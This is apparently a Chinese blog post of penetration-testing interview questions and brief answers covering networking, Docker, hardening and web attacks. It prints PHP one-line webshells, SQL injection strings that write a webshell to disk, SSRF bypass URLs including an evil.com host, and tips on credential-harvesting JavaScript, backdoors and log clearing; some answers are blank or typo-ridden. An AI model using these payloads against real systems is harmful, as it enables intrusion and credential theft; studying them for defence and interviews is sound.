---
layout:     post
title:      2020最新面试题
subtitle:   2020最新面试题
date:       2020-8-1
author:     xiwang
header-img: img/tag-bg-o.jpg
catalog: true
tags:
    - 2020最新面试题

---





#                                                                           大基本功总结





## Windows

#### 1. 3389无法连接的几种情况

没有开放3389 端口被修改 有防护拦截 处于内网需要端口转发

#### 2.一台主机访问百度的完整过程(叙述内容必须包括以下几个要点)

开机流程

登录认证时密码的验证方法以及程序

主机自动获取IP的过程,以及可以获取什么信息

鼠标点击桌面图标时,发生了什么

dns解析前,主机第一个包是什么

数据包经过交换机的时候,发生了什么

数据包抵达出口的时候,发生了什么

dns解析的时候,可能像那些地方进行查询,优先级是什么(包括A, AAA NS CNAME的作用)

获取域名对应的A或者AAA记录之后,GET请求网页得到了什么



## Linux

#### 常见web服务器容器

IIS Apache nginx Tomcat weblogic

#### 如何手工快速判断目标站点是Windows还是linux

linux大小写敏感,windows大小写不敏感

## docker

#### 1.什么是docker镜像

docker镜像是docker容器的源代码,docker镜像用于创建容器

#### 2.什么是docker容器

docker容器包括应用程序及其所有的依赖项,作为操作系统独立运行

#### 3.docker容器有几种状态

运行 已暂停 从新启动 已退出

#### 4.docker容器和镜像的区别

镜像是由一层层只读层堆在一起的,容器是镜像只读层+读写层

## TCP/IP网络



1. #### UDP TCP 特点和区别 

   TCP是

2. #### UDP TCP 首部格式

3. #### TCP三次握手 ,为什么要三次握手

4. #### TCP四次挥手

5. #### TCP长连接和短连接的区别

6. #### TCP粘包,和拆包,以及解决办法

7. #### TCP可靠传输

8. #### TCP滑动窗口

9. #### TCP流量控制

10. #### TCP拥塞控制

11. #### 提供网络利用率

## 安全加固

#### linux系统方面(面试嘛 简单说10个就好,原则5个通用的,5个不常见的)

1.

#### weblogic加固

(1)t3协议关闭
(2)关闭控制台或者删除控制台组件 
(3)自带目录全部删掉 自定义目录
(4)设置复杂密码要求 这个不用设置也可以
(5)设置监控流量跟踪设备 主要是针对0day漏洞

## 数据库基础

#### 一个mysql数据库的站点,只有一个80端口开放,什么原因

改了端口 站库分离 3306端口不对外开放

## 

## python

1. 

## javascript+html+css

1.常用重要的函数举例

alert() console.log() document.write() prompt() print() eval

2.js如何操作游览器 

使用f12看网页源代码，使用network查看发送的请求， 可以查看cookie本地存储信息,可以使用cookie对网站进行测试

## PHP

1. PHP常见一句话木马 手写

   ```php
   <?php eval($_PORT['cmd']);?>
   <?php system($_GET['cmd']);?>
   <?php assert($_POST['cmd']);?>
   <?php include'shell.txt'?>
   
   ```

2. 

## 协议分析

#### 1.常见webshell工具流量特征

蚁剑：无加密请求数据包，User-Agent: antSword/v2.1。蚁剑php类：@ini_set(“display_errors”,”0″);是明文比较好发现。ASP类：流量中进行URL其中的execute在蚁剑中被混淆，变成了拼接形式Ex”&cHr(101)&”cute。冰蝎：加密传输无法获取明文，发送GET请求，服务端会将密钥写入session中，发送给客户端。客户端获取密钥后会加密payload，使用加密的payload发送POST请求。基于GET请求包的检测特征：1.url包含.php?pass=；（密码如果被修改这个特征就会没用了），2.基于POST返回包的检测特征：Transfer-Encoding: chunked

## web安全

### XSS

1.有shell的情况下,如何使用XSS实现对目标网站的长久控制

 后台登录之处加入一段记录登录账号密码的js, 设置判断是否登陆成功,如果登陆成功,就把账号密码记录到一个生僻的路径的文件中,在登陆之后才可以访问的文件中插入XSS脚本

### SSRF

#### 1.SSRF原理

中文名字叫做客户端请求伪造,是由攻击者构造,服务端发起的漏洞,因为是服务端发起,就可以请求到和自己相连,但是和外网隔离的内部系统

#### 2.SSRF形成原因

服务端提供了从其他服务器获取数据的功能,但是没有对目标地址做过滤和限制

#### 3.SSRF常见触发点

web

 格式处理 

数据库

 广义ssrf[扫一扫 打开文档(宏) 客户端Markdown预览] 

XSPA

 图片加载[头像 以图搜图 插入图片 图片变化 Markdown显示图片] 

下载服务[百度云离线下载]

 预览服务[分享网站 收藏 网址预览] 

文件包含[开启了allow_url_fopen]

 多媒体加载[百度网盘 新浪网盘 56视频 网易直播]

 Api Demo[美丽说开发平台 搜狐webhook工具] 

站长工具[存货探测 监控 网站监测 获取源码] 

在线编程[危险函数] 

应用/中间件/自带实例文件[weblogic ] RSS[QQ邮箱RSS处]等

#### 4.SSRF常见触发点参数名

share wap url link src source target u 3g display sourceURL imageURL domain 等

##### 5.SSRF防御方法

输入合法性效验 返回结果效验 网络下肢 后缀限制 正则验证协议名 hostname限制 黑名单限制 域名解析 硬端口编码

#### 6.SSRF绕过思路

@绕过： www.baidu.com@127.0.0.1:7001
采用十进制及十六进制 访问 127.0.0.1：
http://2130706433  http://0x7F000001
302临时文件跳转，301永久文件跳转：跳转gopher
file：// 看文件  dict:// 端口扫描 命令执行
sftp：// ftp:// tftp:// 文件传输
ldap：// 轻量目录访问 gopher:// 都有
xip绕过：
http://10.0.0.1.xip.io = 10.0.0.1
封闭式字母数字绕过
句号绕过：
127。0。0。1 = 127.0.0.1
解析url方式不一致绕过:
http://127.0.0.1:11211:80
http://google.com#@evil.com

### 文件上传

#### 1.有webshell前提下,网站根目录下有.htaccess文件,可以做什么

写一条解析规则,将上传的png文件后缀的当成php代码执行

#### 2.审查上传点的元素有什么意义

有些站点的上传文件限制是前端限制,这样只需要增加,上传类型就可以突破限制了

#### 3.上传目标网站没有防护,上传图片可以正常访问,上传脚本格式访问403,是什么原因

原因较多,可能是web服务器配置把上传目录写死了不执行相应脚本,可以尝试修改文件后缀名绕过

### sql注入

#### 1.sql注入点。使用工具写入一句话，需要满足哪些条件

root权限和网站绝对路径还可以使用union查询

SQL写入一句话木马1. 判断长度?id=1’ order by 7--+

创建目录?id=1’ union select 1,2,3,4,5,6,7 into outfile ‘/etc/www/test.txt’ --+

写一句话木马进文件?id=1’ union select 1,2,3,4,5,6,’<?PHP  @eval($_post[“test”])? >’  into outfile ‘/etc/www/test.php’ --+

#### 2.突破字符转义的方法

宽字节绕过

hex编码绕过

#### 3.注入漏洞,只能查账号密码吗

这个主要权限够大,库的数据想怎么看怎么看

#### 4.注入时可以不使用 and or 或者 xor 直接 order by 可以开始注入吗

and/or/xor,  前面的1=1 1=2步骤是为了判断是否为注入点,如果已经确定是注入点,那就可以省略

#### 5.某个防注入系统,在注入时会提示:

系统检测到你有非法注入行为

已记录IP xx.xx.xx.xx

时间:2016:01-23

提交页面:test.asp?id=115

提交内容;and 1=1

##### 6.如何利用防注入系统拿shell

在URl里面直接提交一句话,这样网站会把一句话写入到数据库中,这样可以尝试寻找网站的配置文件 直接上菜刀连接

#### 7.SQL注入有以下两个测试选项,选择一个,并阐述不选择另外一个的理由

a. demo.jsp?id=2+1

b.demo.jsp?id=2-1

选择B 在url编码中 +号代表空格, 可能会造成混淆

#### 8,以下链接存在sql注入漏洞,对于这个变形注入,有什么思路

demo.do?DATA=AjAxNg==

DATA有可能是经过base64编码在传入服务器的,所以我们也要对参数进行base64编码才能正确的完成测试

#### 9.发现demo.jsp?uid=110 注入点,有那几种思路获取webshell,那种是优选

(1)有写入权限的话,构造联合查询语句 使用using into outfile  可以将查询的输出重定向到系统的文件中,

(2)使用sqlmap -os-shell 原理和上面的一种相同,来直接获得一个shell, 这样效率更高,

(3)通过构造联合查询语句,得到网站管理员的账户和密码 ,然后扫码登录后台 再在后台通过改包上传的形式 getshell

#### 10.sql注入 5.0以上和5.0以下有什么区别

5.0以下是单用户多操作的形式 5.0以上是多用户多操作 而且有infomation_schema这个表,5.0以下是没有的,只能暴力跑表名

11.圈出下面会话中可能存在的问题项,并标注可能会存在什么问题?

![image-20200806160409032](D:\学习\mazhenj.github.io\_posts\image-20200806160409032.png)

### 解析漏洞

#### 1.解析漏洞原理

解析后缀文件时,被解析成脚本

#### 2.常见解析漏洞

IIS6.0  举例 /xx.asp/xx.jpg  xx/asp是文件夹名字

IIS7.0和7.5 nginx <8.0.3默认Fast_CGI 开启状态,直接在url中图片地址后面输入/1.php 1.jpg会被当作PHP脚本来解析

nginx小于等于0.8.37  利用百分号00截断上传 xxx.jpg%00.php

原理:当URL中有不存在的文件，PHP就会向前递归解析。

 apache解析漏洞 原理 从右边往左判断的 如果不认识就会再往前判断



## 提权

#### 1.提权选择可读写的目录,为何尽量不使用带空格的目录

exp执行执行,大部分都需要空格界定参数

## 逻辑漏洞

#### 1.目标站点禁止注册,找回密码出,输入用户名"此用户不存在"如何利用

爆破用户名,利用用户名爆破密码

#### 2.说出至少三种逻辑漏洞, 和修复方式

1.密码允许暴力破解 可以设置错误多少次就锁定的次数 

2.存在通用型找回凭证

3.可以跳过验证步骤

4.找回凭证可以拦包获取

4验证码可以通过改包的方法绕过等

## 文件包含

#### 1.站点发现某TXT的下载地址为

http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？

看到file文件协议,在file=后面输入index.php 下载他的首页文件,在首页里面继续找其他网站的配置文件,可能会找出,网站数据库密码的地址

#### 2.

## WAF

#### 1.安全狗会追踪变量,发现是一句话木马吗

是根据的特征码匹配的,不会这么智能

## 爆破

#### 1.basic有那几种爆破方式

url 用户名和密码

使用burp +base64编码形式

## 内网渗透

#### 1.在Windows2003服务器中建立一个.zhongzi文件夹,用意何为

隐藏文件夹,为了不管理员发现上传上去的工具

## 开放题

#### 1.拿到一个待检测的站，你觉得应该先做什么/给你一个网站，你会怎么渗透

信息收集

获取域名whois信息，注册人邮箱电话姓名等，放入社工库中搜寻有没有泄露的密码，在使用泄露的的密码进行登录，使用邮箱做关键词，在各大搜索引擎中搜索出相关的社交账号，尝试找出管理员设置密码的习惯，在利用收集到的信息生成专用字典，进行后台账号密码爆破

收集站点子域名，主站渗透不进去的话，尝试旁站入手了

收集站点服务器 操作系统 后端语言 中间件 搜索引擎查对应版本号的已知漏洞

查看真实IP 扫描端口 对存在端口进行探测，看一下是否有弱口令等

扫描站点目录结构，判断是否可以遍历目录，有敏感文件泄露等

漏洞扫描

对常见web漏洞进行测试，比如 SQL注入 XSS SSRF CSRF 代码执行 命令执行 越权访问 目录读取 任意文件读取，弱口令 暴力破解等

漏洞利用

利用web漏洞 进行getshell

提权

提升权限 例如 Windows MySQL udf提权 Linux 藏牛提权

日志清理

总结一下报告和修复方案

#### 2.判断网站CMS对渗透有什么意义

利用对应版本号 搜索已知漏洞

如果开源，下载源码进行审计

#### 3.成熟并相对安全的MCS扫描目录意义

查找敏感文件，二级目录扫描，是否有网站北方压缩文件等

#### 4.新闻后台编辑页面,看到编辑器,可以做什么

查看编辑器版本,利用搜索引擎搜索公开漏洞

#### 5.某服务器有站点A,B A后台添加test用户,访问B后台,也有test用户?

同一个数据库

#### 6.上传大马后,访问乱码,有哪些解决办法

游览器中改编码尝试

#### 7.后台修改管理员密码处,原密码显示为* 如何实现读出这用户的密码

审查元素,吧密码处的password 属性改成text就是明文显示了

#### 8.审查元素就可以知道所使用的防护软件,是这么做到的

F12查看HTMl体部 比如护卫神就可以在名称那看到内容 <hws>内容<hws>



#### 9.CSRF XSS XXE 区别修复方式

CSRF 跨站请求伪造 在页面中嵌入token ,输入密码的时候验证referer

XSS是跨站脚本  对实体字符转义 使用http only 禁止 js读取 cookie值输入效验 游览器和web端使用相同编码

XXE XML外部实体注入 禁止对外部实体的解析即可

#### 10.CSRF SSRF 重放攻击区别

CSRF 是跨站请求伪造

SSRF 服务端请求伪造

重放攻击 是将截获的数据包,进行重新发送, 

#### 11.linux常见的后门,以及Windows常见的后门(举例)

linux:

alias ssh 计划任务设置反弹shell 

Windows:

嗅探后门 放大镜后门 组策略后门

12.owasp top 10都有什么,

注入 构造不安全的命令发给解释器

失效的身份验证 弱口令 弱会话等

敏感数据泄露 指一些不想让用户看到的数据,被看到了,还有就是数据在传输过程中,没有加密

外部实体XXE 引用了外部实体 ,导致可以被攻击者,窃取内部文件,执行代码 ddos等

失效的访问控制 通过身份验证的用户,可以访问其他用户的相关信息

安全错误配置 操作者配置不当,造成攻击者可以利用这些配置,获取更高德权限

跨站脚本XSS 包含了不受信任,没有恰当验证的,js代码,攻击者可以,执行脚本,劫持用户会话等

不安全的反序列化 远程代码执行,重放攻击

使用已知漏洞的组件 利用已知的漏洞 进行窃取数据等

不足的日志记录和监控

#### 13.渗透测试的执行标准

前期交互 信息收集 威胁建模 漏洞分析 漏洞攻击 后渗透 报告

#### 14.那些地方可能发生信息泄露 ,怎么利用

(1)banner指纹信息,比如 操作系统 中间件 编程语言版本 目标网站的公司.招聘什么类型的开发人员

(2)测试页面,编辑器的备份文件,git文件信息 后台的管理地址

(3)github上面 看远吗 有没有数据库密码,邮箱账号密码之类的,还可以使用网络上搜索百度网盘的那种网站,看有没有可能有被员工上传过铭感文件

#### 15.ddos和CC攻击的区别

ddos是分布式拒绝服务攻击 ,发送大量请求,让目标网站挂掉

cc攻击是ddos的一种,全称的中文意思叫做挑战黑洞,不过他是利用代理服务器和肉鸡,这样都是正常的请求的,去访问目标网站的动态页面,动态页面就是需要和后端数据库做大量交互的地方,这样一直去消耗CPU的资源,造成拒绝服务 也就是说一个是针对web网络的,一个是针对web应用层面

#### 16.acces 扫描出asp的数据库文件 ,访问乱码 ,如何实现本地利用

 迅雷下载下来 改后缀是.mdb

